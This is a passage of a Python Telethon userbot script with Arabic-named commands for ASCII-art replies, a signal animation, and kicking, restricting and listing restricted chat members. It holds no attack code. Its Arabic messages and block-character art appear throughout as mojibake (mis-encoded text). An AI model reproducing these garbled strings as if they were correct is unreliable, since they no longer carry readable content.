‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚óè‚ñà‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñë‚ñë‚ñà‚ñà‚ñë          ‚ñë‚ñà‚ñà‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.ÿØÿ≥ ŸÑÿßŸäŸÉ'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ
‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà
‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà
‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà
‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà
‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà
‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñà‚ñà‚ñà‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÄ‚ñë‚ñë‚ñà‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÄ
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñë‚ñë‚ñë‚ñë‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñë‚ñë‚ñë‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñë‚ñë‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñë‚ñë‚ñà
‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñÄ‚ñÄ
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.ÿßÿ¥ÿßÿ±ÿ©'))
async def signal_animation(event):
    await event.delete()
    
    sequences = [
        "‚ñÅ ‚ñÇ ‚ñÑ ‚ñÖ ‚ñÜ ‚ñá ‚ñà",
        "‚ñÅ ‚ñÇ ‚ñÑ ‚ñÖ ‚ñÜ ‚ñá ‚ñí",
        "‚ñÅ ‚ñÇ ‚ñÑ ‚ñÖ ‚ñÜ ‚ñí ‚ñí",
        "‚ñÅ ‚ñÇ ‚ñÑ ‚ñÖ ‚ñí ‚ñí ‚ñí",
        "‚ñÅ ‚ñÇ ‚ñÑ ‚ñí ‚ñí ‚ñí ‚ñí",
        "‚ñÅ ‚ñÇ ‚ñí ‚ñí ‚ñí ‚ñí ‚ñí",
        "‚ñÅ ‚ñí ‚ñí ‚ñí ‚ñí ‚ñí ‚ñí",
        "‚ñí ‚ñí ‚ñí ‚ñí ‚ñí ‚ñí ‚ñí",
        "‚ñí ‚ñí ‚ñí ‚ñí ‚ñí ‚ñí ‚ñÅ",
        "‚ñí ‚ñí ‚ñí ‚ñí ‚ñí ‚ñÇ ‚ñÅ",
        "‚ñí ‚ñí ‚ñí ‚ñí ‚ñÑ ‚ñÇ ‚ñÅ",
        "‚ñí ‚ñí ‚ñí ‚ñÖ ‚ñÑ ‚ñÇ ‚ñÅ",
        "‚ñí ‚ñí ‚ñÜ ‚ñÖ ‚ñÑ ‚ñÇ ‚ñÅ",
        "‚ñí ‚ñá ‚ñÜ ‚ñÖ ‚ñÑ ‚ñÇ ‚ñÅ",
        "‚ñà ‚ñá ‚ñÜ ‚ñÖ ‚ñÑ ‚ñÇ ‚ñÅ"
    ]
    
    try:
        
        message = await event.reply(sequences[0])
        
        
        for seq in sequences[1:]:
            await asyncio.sleep(1)  
            await message.edit(seq)
    
        
        
        
        
    except Exception as e:
        await event.reply(f"‚ö†Ô∏è ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ™ŸÜŸÅŸäÿ∞ ÿ£ŸÖÿ± ÿßŸÑÿ•ÿ¥ÿßÿ±ÿ©: {e}")

@client.on(events.NewMessage(from_users='me', pattern='.ÿ∑ÿ±ÿØ'))
async def kick_user(event):
    try:
        
        if event.is_reply:
            reply_message = await event.get_reply_message()
            user_id = reply_message.sender_id
        else:
            
            command, username = event.raw_text.split(' ', 1)
            if username.startswith('@'):
                username = username[1:]  
            user = await client.get_entity(username)
            user_id = user.id
        
        
        try:
            await client(EditBannedRequest(
                event.chat_id,
                user_id,
                ChatBannedRights(until_date=None, view_messages=True)  
            ))
            await event.reply(f"‚éô ÿ™ŸÖ ÿ∑ÿ±ÿØ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿ®ŸÜÿ¨ÿßÿ≠.")
        except UserAdminInvalidError:
            await event.reply("‚éô ŸÑÿß ŸäŸÖŸÉŸÜ ÿ∑ÿ±ÿØ ÿßŸÑŸÖÿ¥ÿ±ŸÅŸäŸÜ.")
        except ChatAdminRequiredError:
            await event.reply("‚éô ŸÑÿß ÿ£ŸÖŸÑŸÉ ÿµŸÑÿßÿ≠Ÿäÿßÿ™ ÿ∑ÿ±ÿØ ÿßŸÑÿ£ÿπÿ∂ÿßÿ°.")
        except Exception as e:
            await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ŸÖÿ≠ÿßŸàŸÑÿ© ÿßŸÑÿ∑ÿ±ÿØ: {e}")
    except ValueError:
        await event.reply("‚éô ÿßÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑÿµŸäÿ∫ÿ© ÿßŸÑÿµÿ≠Ÿäÿ≠ÿ©: .ÿ∑ÿ±ÿØ @username ÿ£Ÿà ÿ®ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ©.")

restricted_users_file = 'restricted_users.pkl'  


if os.path.exists(restricted_users_file):
    with open(restricted_users_file, 'rb') as f:
        restricted_users = pickle.load(f)
else:
    restricted_users = set()


@client.on(events.NewMessage(pattern=r'^.ÿ™ŸÇŸäŸäÿØ(?:\s+@?\w+)?$'))
async def restrict_user(event):
    if event.is_reply:  
        replied_msg = await event.get_reply_message()
        user_id = replied_msg.sender_id
        try:
            user = await event.get_reply_message().get_sender()
            user_name = user.first_name
            if user.last_name:
                user_name += f" {user.last_name}"
            if user.username:
                user_name += f" (@{user.username})"
        except Exception:
            user_name = "ÿ∫Ÿäÿ± ŸÖÿπÿ±ŸàŸÅ"
    else:  
        try:
            args = event.raw_text.split()
            if len(args) < 2:
                await event.reply("‚éô Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿ£Ÿà ŸÉÿ™ÿßÿ®ÿ© ÿßŸÑŸäŸàÿ≤ÿ± ÿßŸÑÿÆÿßÿµ ÿ®Ÿá.")
                return
            username = args[1]
            if username.startswith('@'):
                username = username[1:]
            user = await client.get_entity(username)
            user_id = user.id
            user_name = user.first_name
            if user.last_name:
                user_name += f" {user.last_name}"
            if user.username:
                user_name += f" (@{user.username})"
        except (IndexError, ValueError):
            await event.reply("‚éô Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿ£Ÿà ŸÉÿ™ÿßÿ®ÿ© ÿßŸÑŸäŸàÿ≤ÿ± ÿßŸÑÿÆÿßÿµ ÿ®Ÿá ÿ®ÿ¥ŸÉŸÑ ÿµÿ≠Ÿäÿ≠.")
            return
        except Exception as e:
            await event.reply(f"‚éô ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ: {e}")
            return

    if user_id not in restricted_users:
        restricted_users.add(user_id)
        rights = ChatBannedRights(
            until_date=None,  
            send_messages=True  
        )
        try:
            await client(EditBannedRequest(event.chat_id, user_id, rights))
            await event.reply(f"‚éô ÿ™ŸÖ ÿ™ŸÇŸäŸäÿØ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ: {user_name}")
            
            
            with open(restricted_users_file, 'wb') as f:
                pickle.dump(restricted_users, f)
        except Exception as e:
            await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ™ŸÇŸäŸäÿØ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ: {e}")
    else:
        await event.reply("‚éô Ÿáÿ∞ÿß ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ŸÖŸÇŸäÿØ ÿ®ÿßŸÑŸÅÿπŸÑ.")


@client.on(events.NewMessage(pattern=r'^.ÿßŸÑÿ∫ÿßÿ° ÿßŸÑÿ™ŸÇŸäŸäÿØ(?:\s+@?\w+)?$'))
async def unrestrict_user(event):
    if event.is_reply:
        replied_msg = await event.get_reply_message()
        user_id = replied_msg.sender_id
        try:
            user = await event.get_reply_message().get_sender()
            user_name = user.first_name
            if user.last_name:
                user_name += f" {user.last_name}"
            if user.username:
                user_name += f" (@{user.username})"
        except Exception:
            user_name = "ÿ∫Ÿäÿ± ŸÖÿπÿ±ŸàŸÅ"
    else:
        try:
            args = event.raw_text.split()
            if len(args) < 2:
                await event.reply("‚éô Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿ£Ÿà ŸÉÿ™ÿßÿ®ÿ© ÿßŸÑŸäŸàÿ≤ÿ± ÿßŸÑÿÆÿßÿµ ÿ®Ÿá.")
                return
            username = args[1]
            if username.startswith('@'):
                username = username[1:]
            user = await client.get_entity(username)
            user_id = user.id
            user_name = user.first_name
            if user.last_name:
                user_name += f" {user.last_name}"
            if user.username:
                user_name += f" (@{user.username})"
        except (IndexError, ValueError):
            await event.reply("‚éô Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿ£Ÿà ŸÉÿ™ÿßÿ®ÿ© ÿßŸÑŸäŸàÿ≤ÿ± ÿßŸÑÿÆÿßÿµ ÿ®Ÿá ÿ®ÿ¥ŸÉŸÑ ÿµÿ≠Ÿäÿ≠.")
            return
        except Exception as e:
            await event.reply(f"‚éô ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ: {e}")
            return

    if user_id in restricted_users:
        restricted_users.remove(user_id)
        rights = ChatBannedRights(
            until_date=None,
            send_messages=False  
        )
        try:
            await client(EditBannedRequest(event.chat_id, user_id, rights))
            await event.reply(f"‚éô ÿ™ŸÖ ÿ•ŸÑÿ∫ÿßÿ° ÿ™ŸÇŸäŸäÿØ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ: {user_name}")
            
            
            with open(restricted_users_file, 'wb') as f:
                pickle.dump(restricted_users, f)
        except Exception as e:
            await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ•ŸÑÿ∫ÿßÿ° ÿ™ŸÇŸäŸäÿØ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ: {e}")
    else:
        await event.reply("‚éô Ÿáÿ∞ÿß ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿ∫Ÿäÿ± ŸÖŸÇŸäÿØ.")


@client.on(events.NewMessage(pattern=r'^.ÿßŸÑŸÖŸÇŸäÿØŸäŸÜ$'))
async def list_restricted_users(event):
    if restricted_users:
        user_list = ""
        for user_id in restricted_users:
            try:
                user = await client.get_entity(user_id)
                user_name = user.first_name
                if user.last_name:
                    user_name += f" {user.last_name}"
                if user.username:
                    user_name += f" (@{user.username})"
                else:
                    user_name += ""
                user_list += f"- {user_name}\n"
            except Exception:
                user_list += f"- ID: {user_id} (ÿ∫Ÿäÿ± ŸÖÿ™ÿßÿ≠)\n"
        
        
        if len(user_list) > 4000:
            
            for i in range(0, len(user_list), 4000):
                await event.reply(user_list[i:i+4000])
        else:
            await event.reply(f"‚éô ŸÇÿßÿ¶ŸÖÿ© ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖŸäŸÜ ÿßŸÑŸÖŸÇŸäÿØŸäŸÜ:\n{user_list}")
    else:
        await event.reply("‚éô ŸÑÿß ŸäŸàÿ¨ÿØ ŸÖÿ≥ÿ™ÿÆÿØŸÖŸàŸÜ ŸÖŸÇŸäÿØŸàŸÜ ÿ≠ÿ™Ÿâ ÿßŸÑÿ¢ŸÜ.")


@client.on(events.NewMessage(incoming=True))
async def delete_muted_user_messages(event):
    if event.is_private and event.chat_id in muted_users:
        await client.delete_messages(event.chat_id, [event.id])
    

async def main():
    await client.start()
    await update_username()

with client:
    client.loop.run_until_complete(main())
    